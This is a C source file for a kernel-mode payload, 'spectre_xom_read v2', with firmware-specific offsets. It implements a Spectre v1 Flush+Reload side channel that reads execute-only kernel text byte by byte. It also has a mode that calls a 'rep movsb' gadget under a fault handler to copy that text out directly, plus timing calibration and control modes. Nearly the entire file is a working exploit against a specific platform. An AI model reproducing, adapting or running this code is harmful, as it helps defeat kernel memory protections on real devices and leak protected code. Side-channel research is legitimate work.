#include <stdint.h>

/*
 * spectre_xom_read v2 — Spectre v1 Flush+Reload ktext byte reader
 *                        + rep movsb alternative + calibration mode
 *
 * v2 changes from v1:
 *   - Added calibration mode (0x7300) to measure actual cache hit/miss timing
 *   - Raised default threshold from 80 → 300 cycles
 *   - Removed cli/sti (HV may intercept, causing VMEXIT disruption)
 *   - Pre-touch all 256 probe pages before attack to ensure mapping
 *   - Added raw timing dump in calibration mode
 *   - Reduced excess lfence in timing loop (was over-serializing)
 *
 * fw_ver encoding:
 *   0x7000         = Control test: read known kdata byte via Spectre
 *   0x7100 + idx   = Attack: read ktext byte at get_timer_freq + idx
 *   0x7200         = rep movsb: copy 64 bytes from get_timer_freq
 *   0x7300         = Calibration: measure cache hit/miss/overhead timing
 *
 * Output layout (288 uint64_t slots, 2304 bytes):
 *   [0]     = MAGIC (lo32) | status (hi32)
 *   [1]     = kdata_base
 *   [2]     = ktext_base
 *   [3]     = mode
 *   [4]     = td_pcb
 *   [5]     = probe_base
 *   [6]     = threshold used
 *   [7]     = num_rounds
 *
 *   Control/Attack (0x70/0x71):
 *   [8]     = expected byte (control only)
 *   [9]     = recovered byte
 *   [10]    = confidence (best histogram count)
 *   [11]    = match (control) / bytes_recovered (attack)
 *   [12]    = target address
 *   [13]    = recovered | (confidence<<8) | (2nd_best<<16) | (2nd_conf<<24)
 *   [14]    = total_hits (sum of all histogram entries)
 *   [64..127] = histogram[0..255] packed 4 × uint16_t per slot
 *
 *   Calibration (0x73):
 *   [8]     = rdtscp overhead (min of 1000 measurements)
 *   [9]     = cache hit time (min, after pre-load)
 *   [10]    = cache miss time (min, after clflush)
 *   [11]    = suggested threshold (midpoint)
 *   [12]    = cache hit time (avg of 100)
 *   [13]    = cache miss time (avg of 100)
 *   [14..77] = raw hit times (first 64, packed 4 per slot as uint16_t)
 *   [78..141]= raw miss times (first 64, packed 4 per slot as uint16_t)
 *
 *   rep movsb (0x72):
 *   [11]    = fault status (0=success, 0xFAFA...=faulted)
 *   [12..19]= copied bytes (64 bytes = 8 slots)
 *   [20]    = source address
 *   [21]    = gadget address
 *   [22]    = destination buffer address
 *
 *   [287]   = end marker
 */

#define MAGIC_SPEC       0x53504543   /* "SPEC" */
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218

/* FW 4.03 offsets */
#define OFF_GET_TIMER_FREQ  0x294320  /* ktext offset of get_timer_freq */
#define OFF_IDT          0x64cdc80
#define OFF_REP_MOVSB    (-0x99002a)  /* rep movsb; pop rbp; ret */

#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

/* Spectre parameters */
#define PROBE_OFFSET     0x4000000    /* 64MB into kdata */
#define PAGE_STRIDE      4096
#define TRAIN_ARRAY_SZ   16
#define NROUNDS          5000         /* rounds per byte (need many for narrow Zen 2 window) */
#define TRAIN_ITERS      30           /* 29 training + 1 attack per group */
#define CACHE_THRESHOLD  300          /* cycles: raised from 80 */

/* Output slot count */
#define OUT_SLOTS        288

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

/* ------------------------------------------------------------------ */
/* Inline ASM helpers                                                  */
/* ------------------------------------------------------------------ */

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline void clflush(volatile void *addr)
{
    __asm__ volatile("clflush (%0)" :: "r"(addr) : "memory");
}

static inline void lfence_barrier(void)
{
    __asm__ volatile("lfence" ::: "memory");
}

static inline void mfence_barrier(void)
{
    __asm__ volatile("mfence" ::: "memory");
}

static inline uint64_t rdtscp_val(void)
{
    uint32_t lo, hi, aux;
    __asm__ volatile("rdtscp" : "=a"(lo), "=d"(hi), "=c"(aux));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

/* ------------------------------------------------------------------ */
/* Training data — MUST be initialized (no .bss)                       */
/* ------------------------------------------------------------------ */

static uint8_t training_data[TRAIN_ARRAY_SZ] = {
    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0
};

/*
 * Volatile bound for the speculative gadget. Flushing this from cache
 * before the attack iteration delays branch resolution, creating a
 * speculation window where the CPU executes the branch body with the
 * attacker-controlled index.
 */
static volatile uint64_t array_bound = TRAIN_ARRAY_SZ;

/* ------------------------------------------------------------------ */
/* Spectre v1 victim function                                          */
/* ------------------------------------------------------------------ */

static void __attribute__((noinline))
victim_function(uint8_t *array, volatile uint64_t *bound,
                uint64_t probe_base, uint64_t x)
{
    if (x < *bound) {
        uint64_t val = array[x];
        volatile uint8_t *probe_addr =
            (volatile uint8_t *)(probe_base + val * PAGE_STRIDE);
        (void)*probe_addr;
    }
}

/* ------------------------------------------------------------------ */
/* Read one byte via Spectre v1 Flush+Reload                           */
/* ------------------------------------------------------------------ */

static uint8_t spectre_read_byte(
    uint64_t target_addr,
    uint64_t probe_base,
    int num_rounds,
    uint64_t threshold,
    uint16_t *out_conf,
    uint16_t *hist_out,
    uint64_t *out_total_hits)
{
    uint16_t histogram[256];
    for (int i = 0; i < 256; i++)
        histogram[i] = 0;

    uint64_t attack_offset = target_addr - (uint64_t)training_data;
    uint64_t total_hits = 0;

    for (int round = 0; round < num_rounds; round++) {
        /* 1. Flush all 256 probe pages */
        for (int i = 0; i < 256; i++)
            clflush((void *)(probe_base + (uint64_t)i * PAGE_STRIDE));

        mfence_barrier();

        /* 2. Training + attack: 29 training, 1 attack */
        for (int mix_i = 0; mix_i < TRAIN_ITERS; mix_i++) {
            /* Flush the bound variable to delay branch resolution */
            clflush((void *)&array_bound);
            mfence_barrier();
            lfence_barrier();

            /*
             * Branchless index selection:
             * mix_i < 29: training (in-bounds), mix_i == 29: attack
             */
            uint64_t diff = (uint64_t)((int64_t)mix_i - (TRAIN_ITERS - 1));
            uint64_t mask = ~(diff >> 63);
            uint64_t training_idx = (uint64_t)(mix_i % TRAIN_ARRAY_SZ);
            uint64_t x = (attack_offset & mask) | (training_idx & ~mask);

            victim_function(training_data, &array_bound, probe_base, x);
        }

        mfence_barrier();
        lfence_barrier();

        /* 3. Timing phase — NO cli/sti (HV may intercept) */
        for (int i = 0; i < 256; i++) {
            /* Scrambled order to avoid prefetcher */
            int idx = i ^ 0xA5;

            volatile uint8_t *addr =
                (volatile uint8_t *)(probe_base + (uint64_t)idx * PAGE_STRIDE);

            uint64_t t0 = rdtscp_val();
            (void)*addr;
            uint64_t t1 = rdtscp_val();

            uint64_t delta = t1 - t0;
            if (delta < threshold) {
                histogram[idx]++;
                total_hits++;
            }
        }
    }

    /* Find best candidate */
    uint8_t best = 0;
    uint16_t best_count = 0;
    for (int i = 0; i < 256; i++) {
        if (histogram[i] > best_count) {
            best_count = histogram[i];
            best = (uint8_t)i;
        }
    }

    if (out_conf)
        *out_conf = best_count;
    if (out_total_hits)
        *out_total_hits = total_hits;

    if (hist_out) {
        for (int i = 0; i < 256; i++)
            hist_out[i] = histogram[i];
    }

    return best;
}

/* ------------------------------------------------------------------ */
/* rep movsb direct copy attempt                                       */
/* ------------------------------------------------------------------ */

static uint64_t try_rep_movsb(
    uint64_t ktext_src,
    uint64_t kdata_dst,
    uint64_t count,
    uint64_t gadget_addr,
    uint64_t onfault_addr)
{
    uint64_t result;
    __asm__ volatile(
        "leaq 2f(%%rip), %%rax\n\t"
        "movq %%rax, (%[onfault])\n\t"

        "movq %[src], %%rsi\n\t"
        "movq %[dst], %%rdi\n\t"
        "movq %[cnt], %%rcx\n\t"

        "pushq %%rbp\n\t"

        "callq *%[gadget]\n\t"

        "movq $0, %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"

        "2:\n\t"
        "addq $8, %%rsp\n\t"
        "movabsq $0xFAFAFAFAFAFAFAFA, %[result]\n\t"

        "1:\n\t"
        : [result] "=&r"(result)
        : [src] "r"(ktext_src), [dst] "r"(kdata_dst),
          [cnt] "r"(count), [gadget] "r"(gadget_addr),
          [onfault] "r"(onfault_addr)
        : "rax", "rcx", "rdx", "rsi", "rdi",
          "r8", "r9", "r10", "r11", "memory", "cc"
    );
    return result;
}

/* ------------------------------------------------------------------ */
/* Entry point                                                         */
/* ------------------------------------------------------------------ */

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    /* Zero output */
    for (int i = 0; i < OUT_SLOTS; i++)
        out[i] = 0;

    /* Derive addresses */
    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;
    uint64_t probe_base = kdata_base + PROBE_OFFSET;

    /* Get td_pcb for onfault */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);
    uint64_t onfault_addr = td_pcb + PCB_ONFAULT;

    /* Write header */
    out32[0] = MAGIC_SPEC;
    out32[1] = 0x01;  /* in-progress */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[4] = td_pcb;
    out[5] = probe_base;
    out[6] = CACHE_THRESHOLD;
    out[7] = NROUNDS;
    mfence_barrier();

    uint16_t mode_hi = (fw_ver >> 8) & 0xFF;
    uint16_t mode_lo = fw_ver & 0xFF;

    /* Pre-touch all 256 probe pages to ensure they're mapped.
     * Read (not write) to avoid corrupting kernel data. If a page
     * isn't mapped, the read will fault — but kdata pages should exist. */
    if (mode_hi == 0x70 || mode_hi == 0x71 || mode_hi == 0x73) {
        for (int i = 0; i < 256; i++) {
            volatile uint8_t *p =
                (volatile uint8_t *)(probe_base + (uint64_t)i * PAGE_STRIDE);
            (void)*p;
        }
        mfence_barrier();
    }

    if (mode_hi == 0x73) {
        /* ============================================================
         * MODE 0x7300: CALIBRATION
         * Measure actual cache hit/miss timing on this hardware.
         * Critical for setting the right threshold.
         * ============================================================ */
        out[3] = 0x7300;

        volatile uint8_t *test_addr =
            (volatile uint8_t *)(probe_base);

        /* Measure rdtscp overhead */
        uint64_t min_overhead = ~0ULL;
        for (int i = 0; i < 1000; i++) {
            lfence_barrier();
            uint64_t t0 = rdtscp_val();
            uint64_t t1 = rdtscp_val();
            uint64_t d = t1 - t0;
            if (d < min_overhead) min_overhead = d;
        }

        /* Measure cache HIT time: read same address repeatedly (stays in L1) */
        (void)*test_addr;  /* prime cache */
        uint64_t min_hit = ~0ULL;
        uint64_t sum_hit = 0;
        uint16_t raw_hits[256];
        for (int i = 0; i < 256; i++) raw_hits[i] = 0;

        for (int i = 0; i < 1000; i++) {
            (void)*test_addr;  /* ensure cached */
            uint64_t t0 = rdtscp_val();
            (void)*test_addr;
            uint64_t t1 = rdtscp_val();
            uint64_t d = t1 - t0;
            if (d < min_hit) min_hit = d;
            if (i < 100) sum_hit += d;
            if (i < 256) raw_hits[i] = (d > 0xFFFF) ? 0xFFFF : (uint16_t)d;
        }

        /* Measure cache MISS time: clflush then read */
        uint64_t min_miss = ~0ULL;
        uint64_t sum_miss = 0;
        uint16_t raw_misses[256];
        for (int i = 0; i < 256; i++) raw_misses[i] = 0;

        for (int i = 0; i < 1000; i++) {
            clflush(test_addr);
            mfence_barrier();
            uint64_t t0 = rdtscp_val();
            (void)*test_addr;
            uint64_t t1 = rdtscp_val();
            uint64_t d = t1 - t0;
            if (d < min_miss) min_miss = d;
            if (i < 100) sum_miss += d;
            if (i < 256) raw_misses[i] = (d > 0xFFFF) ? 0xFFFF : (uint16_t)d;
        }

        out[8] = min_overhead;
        out[9] = min_hit;
        out[10] = min_miss;
        out[11] = (min_hit + min_miss) / 2;  /* suggested threshold */
        out[12] = sum_hit / 100;     /* avg hit */
        out[13] = sum_miss / 100;    /* avg miss */

        /* Pack raw hit times: 4 uint16_t per uint64_t slot */
        for (int i = 0; i < 256; i++) {
            int slot = 14 + (i / 4);
            int shift = (i % 4) * 16;
            out[slot] |= ((uint64_t)raw_hits[i]) << shift;
        }
        /* Pack raw miss times */
        for (int i = 0; i < 256; i++) {
            int slot = 78 + (i / 4);
            int shift = (i % 4) * 16;
            out[slot] |= ((uint64_t)raw_misses[i]) << shift;
        }

        out32[1] = 0x30;  /* calibration done */

    } else if (mode_hi == 0x70) {
        /* ============================================================
         * MODE 0x7000: CONTROL TEST
         * Read a known kdata byte via Spectre to validate the pipeline.
         * ============================================================ */
        uint64_t target = kdata_base + OFF_IDT;
        uint8_t expected = read1(target);

        out[3] = 0x7000;
        out[8] = expected;

        uint16_t confidence = 0;
        uint16_t hist_buf[256];
        uint64_t total_hits = 0;
        uint8_t recovered = spectre_read_byte(
            target, probe_base, NROUNDS, CACHE_THRESHOLD,
            &confidence, hist_buf, &total_hits);

        out[9] = recovered;
        out[10] = confidence;
        out[11] = (expected == recovered) ? 1 : 0;
        out[14] = total_hits;

        /* Pack histogram */
        for (int i = 0; i < 256; i++) {
            int slot = 64 + (i / 4);
            int shift = (i % 4) * 16;
            out[slot] |= ((uint64_t)hist_buf[i] & 0xFFFF) << shift;
        }

        /* Second-best */
        uint8_t second = 0;
        uint16_t second_count = 0;
        for (int i = 0; i < 256; i++) {
            if (i == recovered) continue;
            if (hist_buf[i] > second_count) {
                second_count = hist_buf[i];
                second = (uint8_t)i;
            }
        }
        out[12] = target;
        out[13] = (uint64_t)recovered | ((uint64_t)confidence << 8)
                | ((uint64_t)second << 16) | ((uint64_t)second_count << 24);

        out32[1] = 0x10;  /* control done */

    } else if (mode_hi == 0x71) {
        /* ============================================================
         * MODE 0x7100 + idx: KTEXT ATTACK
         * Read ktext byte at get_timer_freq + idx.
         * ============================================================ */
        uint64_t target_offset = OFF_GET_TIMER_FREQ + mode_lo;
        uint64_t target = ktext_base + target_offset;

        out[3] = 0x7100 | ((uint64_t)target_offset << 16);

        int num_bytes = 8;
        if (mode_lo + num_bytes > 255)
            num_bytes = 1;

        out[11] = num_bytes;

        for (int b = 0; b < num_bytes; b++) {
            uint16_t conf = 0;
            uint16_t hist_buf[256];
            uint64_t total_hits = 0;
            uint8_t byte_val = spectre_read_byte(
                target + b, probe_base, NROUNDS, CACHE_THRESHOLD,
                &conf, (b == 0) ? hist_buf : (uint16_t *)0,
                &total_hits);

            out[12 + b * 4 + 0] = target + b;
            out[12 + b * 4 + 1] = (uint64_t)byte_val | ((uint64_t)conf << 8);

            if (b == 0) {
                uint64_t noise = 0;
                uint8_t second = 0;
                uint16_t second_count = 0;
                for (int i = 0; i < 256; i++) {
                    if (i != byte_val)
                        noise += hist_buf[i];
                    if (i != byte_val && hist_buf[i] > second_count) {
                        second_count = hist_buf[i];
                        second = (uint8_t)i;
                    }
                }
                out[12 + 2] = noise;
                out[12 + 3] = (uint64_t)second | ((uint64_t)second_count << 8);
                out[14] = total_hits;

                for (int i = 0; i < 256; i++) {
                    int slot = 64 + (i / 4);
                    int shift = (i % 4) * 16;
                    out[slot] |= ((uint64_t)hist_buf[i] & 0xFFFF) << shift;
                }
            }
        }

        out32[1] = 0x11;  /* attack done */

    } else if (mode_hi == 0x72) {
        /* ============================================================
         * MODE 0x7200: REP MOVSB DIRECT COPY
         * ============================================================ */
        uint64_t ktext_src = ktext_base + OFF_GET_TIMER_FREQ;
        uint64_t kdata_dst = kdata_base + 0x5000;
        uint64_t count = 64;
        uint64_t gadget = kdata_base + OFF_REP_MOVSB;

        out[3] = 0x7200 | ((uint64_t)OFF_GET_TIMER_FREQ << 16);

        for (int i = 0; i < 8; i++)
            write8(kdata_dst + i * 8, 0);

        uint64_t fault = try_rep_movsb(
            ktext_src, kdata_dst, count, gadget, onfault_addr);

        out[11] = fault;

        for (int i = 0; i < 8; i++)
            out[12 + i] = read8(kdata_dst + i * 8);

        out[20] = ktext_src;
        out[21] = gadget;
        out[22] = kdata_dst;

        out32[1] = 0x20;  /* rep movsb done */

    } else {
        out32[1] = 0xFF;
    }

    out[287] = 0xDEADCAFE53504543ULL;
    mfence_barrier();
    return 0;
}
